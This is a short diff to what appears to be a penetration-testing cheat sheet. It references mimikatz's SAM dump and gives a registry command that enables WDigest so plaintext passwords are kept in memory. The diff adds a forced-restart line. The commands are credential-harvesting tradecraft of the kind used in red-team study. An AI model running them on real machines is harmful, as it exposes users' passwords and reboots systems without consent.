@@ -26,5 +26,7 @@ lsadump::sam
 If password hash not crackable enable wdigest in registry
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+Restart-Computer -Force
 ```
 
